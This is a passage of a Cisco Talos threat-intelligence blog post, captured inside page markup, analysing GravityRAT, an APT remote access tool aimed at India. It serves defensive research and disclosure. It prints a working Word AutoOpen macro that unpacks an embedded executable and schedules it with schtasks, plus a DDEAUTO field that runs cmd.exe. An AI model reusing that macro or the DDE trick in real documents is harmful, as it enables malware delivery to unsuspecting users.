+</svg>
+<!-- END ICON -->
+</label>
+<ul class='sub-nav'>
+<li class='desktop-hide'>
+<a href='https://www.talosintelligence.com/community'>
+<h1>Support Communities</h1>
+</a>
+</li>
+<li class='desktop-hide'><label class='subnav-back-button' for='community-sub-trigger'>BACK</label></li>
+<li>
+<a href='https://www.talosintelligence.com/reputation_center/support#reputation_center_support_ticket'>Reputation Center Support</a>
+</li>
+<li><a href='https://snort.org/community' target='_blank'>Snort Community</a></li>
+<li><a href='https://www.clamav.net/contact.html#ml' target='_blank'>ClamAV Community</a></li>
+<li><a href='https://www.spamcop.net/' target='_blank'>SpamCop</a></li>
+</ul>
+<div class='desktop-hide subnav-overlay'>
+<!-- SUPPORT ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='community-icon'>
+<g>
+<path d='M24.7-0.062H1.3C0.582-0.062,0,0.521,0,1.241v17.393c0,0.72,0.582,1.304,1.3,1.304h23.4    c0.718,0,1.3-0.584,1.3-1.304V1.241C26,0.521,25.418-0.062,24.7-0.062z M18.911,12.189c0,1.98-5.911,5.461-5.911,5.461    s-5.911-3.208-5.911-5.461c0-2.251,0-8.189,0-8.189L13,2.361L18.911,4C18.911,4,18.911,10.21,18.911,12.189z' fill='#9EA0A5'></path>
+<polygon fill='#9EA0A5' points='9.671,8.763 8.275,10.16 11.77,13.655 13.166,12.259 17.726,7.699 16.384,6.357 11.824,10.917       '></polygon>
+</g>
+</g>
+</svg>
+<!-- END ICON -->
+</div>
+</li>
+<!-- Incident Response -->
+<li class='nav-item '>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/incident_response'>
+<!-- INCIDENT RESPONSE ICON -->
+<svg height='20px' id='Layer_1' version='1.1' viewBox='0 0 26 20' width='26px' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='nav-ir-icon'>
+<path d='M24.7,0H1.3C0.6,0,0,0.6,0,1.2v17.5C0,19.4,0.6,20,1.3,20h23.4c0.7,0,1.3-0.6,1.3-1.3V1.2   C26,0.6,25.5,0,24.7,0z M7.9,8.9c0-2.9,2.3-5.2,5.1-5.2s5.1,2.3,5.1,5.2v3.5H7.9V8.9z M20.2,15.8c0,0.3-0.2,0.5-0.5,0.5H6.4   c-0.3,0-0.5-0.2-0.5-0.5v-2.1c0-0.3,0.2-0.5,0.5-0.5h13.2c0.3,0,0.5,0.2,0.5,0.5V15.8z' fill='#9EA0A5'></path>
+<path d='M13,5.2L13,5.2c-1.8,0-3.6,1.4-3.6,3.3c0,0.1,0,0.2,0.1,0.3c0.1,0.1,0.2,0.1,0.3,0.1s0.2,0,0.3-0.1   c0.1-0.1,0.1-0.2,0.1-0.3c0-1.3,1.4-2.4,2.7-2.4c0.1,0,0.2,0,0.3-0.1c0.1-0.1,0.1-0.2,0.1-0.3s0-0.2-0.1-0.3   C13.3,5.3,13.2,5.2,13,5.2z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Incident Response</span>
+</a>
+</li>
+<!-- Careers -->
+<li class='nav-item '>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/careers'>
+<!-- CAREERS ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='career-icon'>
+<path d='M24.7,0H1.3C0.582,0,0,0.559,0,1.25v17.499C0,19.44,0.582,20,1.3,20h23.4c0.719,0,1.3-0.56,1.3-1.251V1.25   C26,0.559,25.419,0,24.7,0z M4.047,13.736c-0.21-1.287-0.46-3.002-0.41-3.657c0.052-0.687,0.645-1.194,1.76-1.51   c0.278-0.08,0.562-0.139,0.815-0.184l0.104-0.554C5.774,7.357,5.404,6.46,5.404,5.68c0-1.124,0.767-2.037,1.713-2.037   c0.946,0,1.713,0.913,1.713,2.037c0,0.781-0.371,1.677-0.914,2.152l0.104,0.554C8.275,8.431,8.558,8.49,8.837,8.57   c0.427,0.121,0.777,0.27,1.05,0.447c-0.811,0.26-1.462,0.597-1.938,1.004c-0.606,0.52-0.956,1.182-1.012,1.913   c-0.029,0.385-0.002,0.988,0.08,1.803H4.047z M17.618,17.5H8.383c-0.317-1.938-0.692-4.516-0.617-5.502   c0.079-1.031,0.97-1.796,2.648-2.272c0.418-0.118,0.845-0.209,1.227-0.276l0.156-0.833c-0.817-0.715-1.373-2.062-1.373-3.238   c0-1.691,1.153-3.063,2.576-3.063c1.424,0,2.577,1.372,2.577,3.063c0,1.176-0.556,2.524-1.374,3.238L14.36,9.45   c0.382,0.067,0.808,0.158,1.227,0.276c1.679,0.476,2.569,1.241,2.648,2.272C18.311,12.984,17.937,15.562,17.618,17.5z    M21.953,13.736h-2.969c0.082-0.814,0.109-1.418,0.081-1.803c-0.057-0.73-0.406-1.393-1.013-1.913   c-0.476-0.407-1.127-0.745-1.938-1.004c0.272-0.177,0.623-0.326,1.05-0.447c0.279-0.08,0.562-0.139,0.816-0.184l0.104-0.554   c-0.542-0.475-0.913-1.372-0.913-2.152c0-1.124,0.767-2.037,1.713-2.037s1.713,0.913,1.713,2.037c0,0.781-0.369,1.677-0.912,2.152   l0.104,0.554c0.254,0.045,0.537,0.104,0.815,0.184c1.116,0.316,1.708,0.823,1.761,1.51C22.413,10.734,22.164,12.449,21.953,13.736z   ' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Careers</span>
+</a>
+</li>
+<!-- Blog -->
+<li class='nav-item active'>
+<a class='primary_nav_link' href='https://blog.talosintelligence.com/' id='link_blog'>
+<!-- BLOG ICON -->
+<svg height='22.25px' viewBox='0 0 26 22.25' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='blog-icon'>
+<path d='M24.753,1.356h-2.501l-0.863-0.883C21.091,0.17,20.695,0.002,20.264,0c-0.415,0-0.808,0.16-1.104,0.45  l-0.926,0.906H1.249C0.562,1.356,0,1.917,0,2.604v15.384v0.082v0.568c0,0.717,0.582,1.299,1.3,1.299h15.602l5.297,2.211  l-0.686-2.211H24.7c0.718,0,1.3-0.582,1.3-1.299V18.07v-0.158V2.604C26,1.917,25.438,1.356,24.753,1.356z M6.031,14.773  l13.856-13.58c0.1-0.099,0.233-0.153,0.377-0.153c0.145,0.001,0.279,0.058,0.381,0.161l0.152,0.156l2.089,2.136  c0.102,0.104,0.154,0.24,0.152,0.383c-0.002,0.143-0.06,0.275-0.161,0.374L8.993,17.803l-4.14,1.086L6.031,14.773z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>Blog</span>
+</a>
+</li>
+<!-- Podcasts -->
+<li class='nav-item'>
+<div class='primary-link-wrapper'>
+<a class='primary_nav_link' href='https://talosintelligence.com/podcasts'>
+<!-- PODCAST ICON -->
+<svg height='20px' id='Layer_1' style='enable-background:new 0 0 26 20;' version='1.1' viewBox='0 0 26 20' width='26px' x='0px' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' y='0px'>
+<path class='nav-icon' d='M24.7-0.1H1.3C0.6-0.1,0,0.5,0,1.2v17.4c0,0.7,0.6,1.3,1.3,1.3h23.4c0.7,0,1.3-0.6,1.3-1.3V1.2  C26,0.5,25.4-0.1,24.7-0.1z M9.8,5c0-1.8,1.5-3.2,3.2-3.2c1.8,0,3.2,1.5,3.2,3.2v5.8c0,1.8-1.5,3.2-3.2,3.2c-1.8,0-3.2-1.5-3.2-3.2  V5z M18.5,10.7c0,2.8-2.1,5.2-4.9,5.4V17h2.9c0.3,0,0.6,0.3,0.6,0.6s-0.3,0.6-0.6,0.6h-7c-0.3,0-0.6-0.3-0.6-0.6S9.1,17,9.5,17h2.9  v-0.9c-2.8-0.3-4.9-2.7-4.9-5.4V9.1c0-0.3,0.3-0.6,0.6-0.6s0.6,0.3,0.6,0.6v1.5c0,2.4,1.9,4.3,4.3,4.3s4.3-1.9,4.3-4.3V9.1  c0-0.3,0.3-0.6,0.6-0.6s0.6,0.3,0.6,0.6V10.7z' fill='#9EA0A5'></path>
+</svg>
+<!-- END ICON -->
+<span>Podcasts</span>
+</a>
+</div>
+<input class='sub-nav-trigger' id='podcast-sub-trigger' type='checkbox'/>
+<label class='sub-nav-trigger-label' for='podcast-sub-trigger'>
+<!-- SUBNAVIGATION ICON -->
+<svg height='47.75px' viewBox='0 0 48.167 47.75' width='48.167px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<circle cx='24.083' cy='23.875' fill='none' opacity='0.4' r='22' stroke='#FFFFFF' stroke-miterlimit='10'></circle>
+<g>
+<circle cx='24.083' cy='16.068' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='23.875' fill='#FFFFFF' r='2.496'></circle>
+<circle cx='24.083' cy='31.682' fill='#FFFFFF' r='2.496'></circle>
+</g>
+</svg>
+<!-- END ICON -->
+</label>
+<ul class='sub-nav'>
+<li class='desktop-hide'>
+<a href='https://talosintelligence.com/podcasts'>
+<h1>Podcasts</h1>
+</a>
+</li>
+<li><a href='https://talosintelligence.com/podcasts/shows/beers_with_talos'>Beers with Talos</a></li>
+<li><a href='https://talosintelligence.com/podcasts/shows/talos_takes'>Talos Takes</a></li>
+</ul>
+<div class='desktop-hide subnav-overlay'>
+<!-- PODCAST ICON -->
+<svg height='20px' id='Layer_1' style='enable-background:new 0 0 26 20;' version='1.1' viewBox='0 0 26 20' width='26px' x='0px' xml:space='preserve' xmlns='http://www.w3.org/2000/svg' xmlns:xlink='http://www.w3.org/1999/xlink' y='0px'>
+<path class='nav-icon' d='M24.7-0.1H1.3C0.6-0.1,0,0.5,0,1.2v17.4c0,0.7,0.6,1.3,1.3,1.3h23.4c0.7,0,1.3-0.6,1.3-1.3V1.2  C26,0.5,25.4-0.1,24.7-0.1z M9.8,5c0-1.8,1.5-3.2,3.2-3.2c1.8,0,3.2,1.5,3.2,3.2v5.8c0,1.8-1.5,3.2-3.2,3.2c-1.8,0-3.2-1.5-3.2-3.2  V5z M18.5,10.7c0,2.8-2.1,5.2-4.9,5.4V17h2.9c0.3,0,0.6,0.3,0.6,0.6s-0.3,0.6-0.6,0.6h-7c-0.3,0-0.6-0.3-0.6-0.6S9.1,17,9.5,17h2.9  v-0.9c-2.8-0.3-4.9-2.7-4.9-5.4V9.1c0-0.3,0.3-0.6,0.6-0.6s0.6,0.3,0.6,0.6v1.5c0,2.4,1.9,4.3,4.3,4.3s4.3-1.9,4.3-4.3V9.1  c0-0.3,0.3-0.6,0.6-0.6s0.6,0.3,0.6,0.6V10.7z' fill='#9EA0A5'></path>
+</svg>
+<!-- END ICON -->
+</div>
+</li>
+<!-- About -->
+<li class='nav-item '>
+<a class='primary_nav_link' href='https://www.talosintelligence.com/about'>
+<!-- ABOUT ICON -->
+<svg height='20px' viewBox='0 0 26 20' width='26px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink'>
+<g class='nav-icon' id='about-icon'>
+<path d='M24.7-0.062H1.3C0.582-0.062,0,0.52,0,1.241v17.393c0,0.72,0.582,1.304,1.3,1.304h23.4   c0.718,0,1.3-0.584,1.3-1.304V1.241C26,0.52,25.418-0.062,24.7-0.062z M18.704,4.58c-0.318,0.335-0.616,0.647-0.918,0.961   c-0.092-0.115-0.172-0.233-0.272-0.332c-0.099-0.093-0.218-0.166-0.334-0.254c0.296-0.31,0.594-0.621,0.908-0.951   C18.294,4.198,18.494,4.384,18.704,4.58z M6.876,15.064c-0.053-0.062-0.109-0.125-0.16-0.189c-0.861-1.139-1.398-2.413-1.564-3.83   c-0.208-1.776,0.066-3.474,0.963-5.04c0.906-1.584,2.262-2.652,3.947-3.312c1.089-0.428,2.219-0.63,3.391-0.552   c1.519,0.102,2.904,0.596,4.152,1.469c0.035,0.025,0.068,0.052,0.101,0.08c0.005,0.003,0.008,0.012,0.019,0.027   c-0.337,0.349-0.679,0.686-0.998,1.043c-0.105,0.12-0.209,0.142-0.353,0.142c-2.37-0.003-4.741-0.003-7.112-0.003   c-0.692,0-1.208,0.516-1.208,1.208c-0.001,2.211,0,4.419,0,6.628c0,0.33,0.003,0.66,0.001,0.99c0,0.046-0.014,0.102-0.042,0.134   c-0.364,0.395-0.731,0.786-1.098,1.179C6.907,15.046,6.896,15.052,6.876,15.064z M7.174,15.424   c0.329-0.346,0.642-0.672,0.938-0.983c0.072,0.125,0.128,0.259,0.217,0.363c0.09,0.107,0.213,0.184,0.333,0.283   C8.373,15.39,8.08,15.696,7.771,16.02C7.569,15.819,7.375,15.623,7.174,15.424z M19.151,15.117   c-1.184,1.403-2.693,2.287-4.479,2.683c-2.144,0.477-4.15,0.094-6.011-1.064c-0.149-0.091-0.288-0.203-0.43-0.307   c-0.037-0.026-0.07-0.059-0.115-0.098c0.044-0.046,0.083-0.092,0.125-0.136c0.301-0.323,0.599-0.646,0.904-0.966   c0.039-0.041,0.109-0.073,0.165-0.073c1.244-0.003,2.486,0,3.729,0.002c1.174,0.003,2.348,0.007,3.523,0.007   c0.325,0,0.636-0.066,0.891-0.286c0.27-0.235,0.392-0.542,0.392-0.897c0.002-2.56,0.002-5.119-0.001-7.678   c-0.001-0.105,0.029-0.179,0.101-0.252c0.354-0.373,0.705-0.75,1.07-1.139c0.127,0.164,0.257,0.315,0.372,0.476   c1.011,1.43,1.543,3.016,1.525,4.771C20.896,12.011,20.354,13.688,19.151,15.117z' fill='#9EA0A5'></path>
+</g>
+</svg>
+<!-- END ICON -->
+<span>About</span>
+</a>
+</li>
+<!-- Mobile Only Sign in area -->
+<li class='acct_links desktop-hide'>
+<a class='login-button' href='https://talosintelligence.com/users/auth/saml'>Cisco Login</a>
+</li>
+</ul>
+</div>
+</div>
+</nav>
+<!-- MOBILE NAVIGATION TRIGGER -->
+<input class='nav-trigger' id='nav-trigger' type='checkbox'/>
+<label for='nav-trigger'>
+<!-- NAVIGATION MENU ICON -->
+<svg height='16px' viewBox='0 0 22 16' width='22px' x='0px' xmlns='https://www.w3.org/2000/svg' xmlns:xlink='https://www.w3.org/1999/xlink' y='0px'>
+<g id='menu-icon'>
+<path d='M20.5,3h-19C0.672,3,0,2.329,0,1.5S0.672,0,1.5,0h19C21.328,0,22,0.671,22,1.5S21.328,3,20.5,3z' fill='#FFFFFF'></path>
+<path d='M20.5,9.5h-19C0.672,9.5,0,8.828,0,8c0-0.829,0.672-1.5,1.5-1.5h19C21.328,6.5,22,7.171,22,8   C22,8.828,21.328,9.5,20.5,9.5z' fill='#FFFFFF'></path>
+<path d='M20.5,16h-19C0.672,16,0,15.328,0,14.5S0.672,13,1.5,13h19c0.828,0,1.5,0.672,1.5,1.5S21.328,16,20.5,16z' fill='#FFFFFF'></path>
+</g>
+</svg>
+<!-- END ICON -->
+</label>
+<!-- END OF NAVIGATION / BEGINNING OF PAGE CONTENT -->
+<div id='page_wrapper'>
+<div class='container-fluid full-height'>
+<div class='row full-height'>
+<div class='col-xs-12 col_single'>
+<div class='row'>
+<div class='col-xs-12 publication' id='content-wrapper'>
+<div id='main-wrapper'>
+<div class='main section' id='main'><div class='widget Blog' data-version='1' id='Blog1'>
+<div class='blog-posts hfeed'>
+<!--Can't find substitution for tag [defaultAdStart]-->
+
+                        <div class="date-outer">
+                      
+<h2 class='date-header'><span>Thursday, April 26, 2018</span></h2>
+
+                        <div class="date-posts">
+                      
+<div class='post-outer'>
+<div class='post hentry uncustomized-post-template' itemprop='blogPost' itemscope='itemscope' itemtype='https://schema.org/BlogPosting'>
+<meta content='https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s640/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg' itemprop='image_url'/>
+<meta content='1029833275466591797' itemprop='blogId'/>
+<meta content='6188594294975286687' itemprop='postId'/>
+<a name='6188594294975286687'></a>
+<h3 class='post-title entry-title' itemprop='name'>
+GravityRAT - The Two-Year Evolution Of An APT Targeting India
+</h3>
+<div class='post-header'>
+<div class='post-header-line-1'></div>
+</div>
+<div class='post-body entry-content' id='post-body-6188594294975286687' itemprop='description articleBody'>
+<i>This blog post is authored by <a href="https://twitter.com/securitybeard">Warren Mercer</a> and <a href="https://twitter.com/r00tbsd">Paul Rascagneres</a>.</i><br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s1600/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="1261" data-original-width="1600" height="504" src="https://4.bp.blogspot.com/-5E4KVZuTj5E/WuAYwbmY4_I/AAAAAAAAAY8/yCEYZxdvDe0fqeXPtmrrvHiKdDSBT7dIwCLcBGAs/s640/file_733462E4-BF82-4065-B7FF-6A3871E8A954.jpg" width="640" /></a></div>
+<br />
+<i>Update: 4/30 Since the publication of the blog post, one of the anti-VM capability was commented a lot on Twitter: the detection of Virtual Machines by checking the temperature of the system. We decided to add more details and clarifications concerning this feature. GravityRAT uses a WMI request in order to get the current temperature of the hardware. Here is the output of the query on a physical machine (a Surface Book):<br />
+</i><br />
+<div class="separator" style="clear: both; text-align: center;">
+<i><a href="https://1.bp.blogspot.com/-n20-E-BfwiQ/WucvFfiORUI/AAAAAAAAAag/aWbLDunys9UhfrnvecIOy5z-BeYOLo1JQCLcBGAs/s1600/image13.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="152" data-original-width="842" height="114" src="https://1.bp.blogspot.com/-n20-E-BfwiQ/WucvFfiORUI/AAAAAAAAAag/aWbLDunys9UhfrnvecIOy5z-BeYOLo1JQCLcBGAs/s640/image13.png" width="640" /></a></i></div>
+<i>
+The query returns the temperature of 7 thermal zones.<br />
+Here is the output on a Virtual Machine executed by Hyper-V on the same hardware:<br />
+</i><br />
+<div class="separator" style="clear: both; text-align: center;">
+<i><a href="https://3.bp.blogspot.com/-ifue71YyAug/WucvJRzXCNI/AAAAAAAAAak/8XC3YzAxV1YQ-bvkJUI3fcxvMcVPP3mEgCLcBGAs/s1600/image5.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="90" data-original-width="857" height="66" src="https://3.bp.blogspot.com/-ifue71YyAug/WucvJRzXCNI/AAAAAAAAAak/8XC3YzAxV1YQ-bvkJUI3fcxvMcVPP3mEgCLcBGAs/s640/image5.png" width="640" /></a></i></div>
+<i>
+The feature is not supported. The malware author used this behavior in order to identify VM (such as Sandboxes).<br />
+<br />
+From our tests and the feedback from several researchers, this monitoring is not supported on Hyper-V, VMWare Fusion, VirtualBox, KVM and XEN. It's important to notice that several recent physical systems do not support it (a researcher reported some Lenovo and Dell hosts did not support this). It means that GravityRAT will consider this physical machine as VMs. Importantly to note this check is not foolproof as we have identified physical hosts which do not report back the temperature, however, it should also be considered a check that is identifying a lot of virtual environments. This is particularly important due to the amount of sandboxing &amp; malware detonation being carried out within virtual environments by researchers. </i>
+<br />
+<i><br /></i>
+<br />
+<h2 id="h.wi790b23r5uc">
+Summary</h2>
+<br />
+Today, Cisco Talos is uncovering a new piece of malware, which has remained under the radar for the past two years while it continues to be developed. Several weeks ago, we identified the use of the latest version of this RAT (Remote Access Tool). In this article, we will discuss the technical capabilities, the evolution, development and potential attribution of what we are calling GravityRAT. <br />
+<br />
+GravityRAT has been under ongoing development for at least 18 months, during which the developer has implemented new features. We've seen file exfiltration, remote command execution capability and anti-vm techniques added throughout the life of GravityRAT. This consistent evolution beyond standard remote code execution is concerning because it shows determination and innovation by the actor. <br />
+<br />
+Throughout our investigation, we observed several malicious documents used to attack victims, which we will discuss. These malicious documents were used by the developer to run several tests on the popular analysis platform VirusTotal. Using VirusTotal allowed the developer to make changes in an attempt to decrease antivirus detection.<br />
+<br />
+Although GravityRAT has not been previously published or discussed, there was some information from the National Computer Emergency Response Team (CERT) of India describing GravityRAT as being used in <a href="https://nic-cert.nic.in/NIC_CERT/pdf/13-Advisory%20for%20Malicious%20Targeted%20Attack%20Campaign.pdf">targeted attacks against India</a>. Finally, we will discuss specific attribution elements discovered during our research into GravityRAT as we identify specific information, which we believe to be leaked by the developer, such as location, and potentially their first name.<br />
+<br />
+<a name='more'></a><br />
+<br />
+<br />
+<h2 id="h.8tv5lvvbexct">
+Infection Vectors</h2>
+<br />
+<h3 id="h.b5234nynz852">
+Malicious Office Documents</h3>
+<br />
+The majority of the malicious documents crafted by the malware author are Microsoft Office Word documents. The attacker uses an embedded macro in order to execute malicious code on the victim's system. The document opens and appears as such:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://2.bp.blogspot.com/-dQ1PBhfakzE/Wt7LjOGzQiI/AAAAAAAAAXI/PI9n38agywU4HpIa7IjnDSvbhLMYy83ugCLcBGAs/s1600/image4.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="707" data-original-width="1023" height="442" src="https://2.bp.blogspot.com/-dQ1PBhfakzE/Wt7LjOGzQiI/AAAAAAAAAXI/PI9n38agywU4HpIa7IjnDSvbhLMYy83ugCLcBGAs/s640/image4.png" width="640" /></a></div>
+<br />
+The document asks to the user to enable macros in order to prove that the user is not a robot (similar to the CAPTCHA we often see on the internet). This, however, is a known tactic that a lot of Office-based malware uses. It is an attempt to trick any users who are using Protected Mode on their systems. By enabling macros, the malware is able to begin it's execution. We discovered that the embedded macro is quite small when extracted.<br />
+<pre>Sub AutoOpen()
+  If Not Dir(Environ("TEMP") + "\image4.exe") &lt;&gt; "" Then
+    Const lCancelled_c As Long = 0
+      Dim sSaveAsPath As String
+      sSaveAsPath = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%") + "\temporary.zip"
+      If VBA.LenB(sSaveAsPath) = lCancelled_c Then Exit Sub
+      ActiveDocument.Save
+      Application.Documents.Add ActiveDocument.FullName
+      ActiveDocument.SaveAs sSaveAsPath
+      ActiveDocument.Close
+      Set app = CreateObject("Shell.Application")
+      ExtractTo = CreateObject("WScript.Shell").ExpandEnvironmentStrings("%Temp%")
+      ExtractByExtension app.NameSpace(Environ("TEMP") + "\temporary.zip"), "exe", ExtractTo
+  End If
+End Sub
+
+Sub ExtractByExtension(fldr, ext, dst)
+  Set FSO = CreateObject("Scripting.FileSystemObject")
+  Set app = CreateObject("Shell.Application")
+  For Each f In fldr.Items
+    If f.Type = "File folder" Then
+      ExtractByExtension f.GetFolder, ext, dst
+    ElseIf LCase(FSO.GetExtensionName(f.Name)) = LCase(ext) Then
+      If Not Dir(Environ("TEMP") + "\image4.exe") &lt;&gt; "" Then
+        app.NameSpace(dst).CopyHere f.Path, &amp;H4
+      End If
+    End If
+  Next
+  Shell "schtasks /create /tn wordtest /tr ""'%temp%\image4.exe' 35"" /sc DAILY /f /RI 10 /du 24:00 /st 00:01"
+End Sub
+</pre>
+This macro contains three functions:
+<br />
+<ul>
+<li>
+The first one is executed when the document is opened. The purpose is to copy the active document (the opened Word document) in a temporary directory and to rename it as a ZIP archive. Indeed, the docx format is, in fact, a common ZIP archive, and can be unzipped using common tools.</li>
+</ul>
+<ul>
+<li>
+The second function decompresses this 'temporary.zip' file and extracts the .exe file stored in it.</li>
+</ul>
+<ul>
+<li>
+The third creates a scheduled task, named 'wordtest', to execute this malicious file every day.</li>
+</ul>
+With this approach, the attacker ensures that there is no direct execution (the executable is executed thanks to scheduled tasks), there's no download of an additional payload, and finally, the author uses the fact that the docx format is an archive in order to include its executable (GravityRAT).<br />
+<br />
+<h3 id="h.yb2f6bkydlij">
+Testing By The Author</h3>
+<br />
+During our tracking, we identified several malicious documents submitted from this actor on VirusTotal for testing purposes. They tested the detection on macros (by modifying them, or by executing the calc instead of the malicious payload) and the developers tried dynamic data exchange (DDE) execution in the Office document. This is abusing the DDE protocol which exists within Microsoft Office documents. Whilst this is a feature Microsoft provide it is also a feature that an attacker can leverage for malicious activity, Microsoft published mitigation information <a href="https://docs.microsoft.com/en-us/security-updates/securityadvisories/2017/4053440">here</a> previously. The developer crafted Office Word and Excel documents to see the detection in VirusTotal. The authors tried to hide the DDE object in a different part of the document &#8212; in the main object and the header, for example. The DDE object simply executes Microsoft calc in the detected sample. Here is an example:<br />
+<br />
+<pre>&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;
+
+&lt;w:document [...redated...}] mc:Ignorable="w14 w15 wp14"&gt;&lt;w:body&gt;&lt;w:p w:rsidR="00215C91" w:rsidRDefault="008C166A"&gt;&lt;w:r&gt;&lt;w:fldChar w:fldCharType="begin"/&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:instrText xml:space="preserve"&gt; &lt;/w:instrText&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:rPr&gt;&lt;w:rFonts w:ascii="Helvetica" w:hAnsi="Helvetica" w:cs="Helvetica"/&gt;&lt;w:color w:val="383838"/&gt;&lt;w:spacing w:val="3"/&gt;&lt;w:sz w:val="26"/&gt;&lt;w:szCs w:val="26"/&gt;&lt;w:shd w:val="clear" w:color="auto" w:fill="FFFFFF"/&gt;&lt;/w:rPr&gt;<span style="color: red;">&lt;w:instrText&gt;DDEAUTO c:\\windows\\system32\\cmd.exe "/k calc.exe"&lt;/w:instrText&gt;</span>&lt;/w:r&gt;&lt;w:r&gt;&lt;w:instrText xml:space="preserve"&gt; &lt;/w:instrText&gt;&lt;/w:r&gt;&lt;w:r&gt;&lt;w:fldChar w:fldCharType="end"/&gt;&lt;/w:r&gt;&lt;w:bookmarkStart w:id="0" w:name="_GoBack"/&gt;&lt;w:bookmarkEnd w:id="0"/&gt;&lt;/w:p&gt;&lt;w:sectPr w:rsidR="00215C91"&gt;&lt;w:pgSz w:w="12240" w:h="15840"/&gt;&lt;w:pgMar w:top="1440" w:right="1440" w:bottom="1440" w:left="1440" w:header="720" w:footer="720" w:gutter="0"/&gt;&lt;w:cols w:space="720"/&gt;&lt;w:docGrid w:linePitch="360"/&gt;&lt;/w:sectPr&gt;&lt;/w:body&gt;&lt;/w:document&gt;
+</pre>
+<br />
+We believe the filenames of the submitted samples are clearly testing docs, using different methods and Office tricks to attempt to ensure his malware was undetected. Those names were:<br />
+<ul>
+<li>
+testnew1.docx</li>
+<li>
+Test123.docx</li>
+<li>
+test456.docx</li>
+<li>
+test2.docx</li>
+<li>
+book1test2.xlsx</li>
+<li>
+Test123.doc</li>
+</ul>
+<h2 id="h.a8eqkcgac2bq">
+</h2>
+<h2 id="h.a8eqkcgac2bq">
+GravityRAT</h2>
+<br />
+Our initial discovery of GravityRAT was through a malicious Word document. As explained previously, this Word document had various macros to deliver a final payload.Considering that this was the most recent version of the malware, we decided to ascertain how long this actor had been active, and how their attacks had evolved. We were able to discover four distinct versions of GravityRAT, developed over two years. Next, we will go through what we believe is the development life cycle and feature-addition mission carried out by this developer.<br />
+<h3 id="h.jhj35aalmdst">
+Version G1</h3>
+<br />
+The malware author uses a versioning system starting by the G letter. The oldest version we identified is G1. Here is the PDB path of the sample:<br />
+<pre>f:\F\Windows Work\G1\Adeel's Laptop\G1 Main Virus\systemInterrupts\gravity\obj\x86\Debug\systemInterrupts.pdb</pre>
+You can notice the potential first name of the developers: Adeel. Of course, this information can be manipulated by the malware author. This sample was compiled in December 2016. The original filename of the sample was resume.exe.<br />
+<br />
+The purpose of this version was to steal information on the compromised system:<br />
+<ul>
+<li>
+MAC Address</li>
+<li>
+Computer name</li>
+<li>
+Username</li>
+<li>
+IP address</li>
+<li>
+Date</li>
+<li>
+Steal files with the following extensions: .docx, .doc, .pptx, .ppt, .xlsx, .xls, .rtf and .pdf</li>
+<li>
+The volumes mapped on the system</li>
+</ul>
+<br />
+All this information was then sent to one of the following domains:<br />
+<div class="separator" style="clear: both; text-align: center;">
+<a href="https://3.bp.blogspot.com/-UcHtAEOU3h0/Wt7LxSthMbI/AAAAAAAAAXM/h3Z-qsaR8o0zn2Z4w3WL6wTuA69fN1pigCLcBGAs/s1600/image13.png" style="margin-left: 1em; margin-right: 1em;"><img border="0" data-original-height="185" data-original-width="737" src="https://3.bp.blogspot.com/-UcHtAEOU3h0/Wt7LxSthMbI/AAAAAAAAAXM/h3Z-qsaR8o0zn2Z4w3WL6wTuA69fN1pigCLcBGAs/s1600/image13.png" /></a></div>
+G1 also had the ability to execute commands remotely on the infected host machine at the author's will.<br />
+<br />
+<h3 id="h.12weuwfsr5vj">
+Version G2</h3>
+<br />
+We identified a new variant used in July 2017 named G2. Here is the PDB of the sample:<br />
+<pre>e:\Windows Work\G2\G2 Main Virus\Microsoft Virus Solutions (G2 v5) (Current)\Microsoft Virus Solutions\obj\Debug\Windows Wireless 802.11.pdb</pre>
+For this version, the developer modified the architecture of the malware. The main code aims to load and execute two additional .NET binaries stored in the resources of the file:<br />
+<ul>
+<li>
+The first resource is a legitimate open-source library available on <a href="https://github.com/dahall/TaskScheduler">GitHub</a>. It's a .NET wrapper for the Windows Task Scheduler</li>
+<li>
+The second is the G2 version of GravityRAT</li>
+</ul>
+<br />
+This variant shares the same command and control (C2) servers as G1, however, we have an additional 'payload' variable added to G2.<br />
+<div class="separator" style="clear: both; text-align: center;">
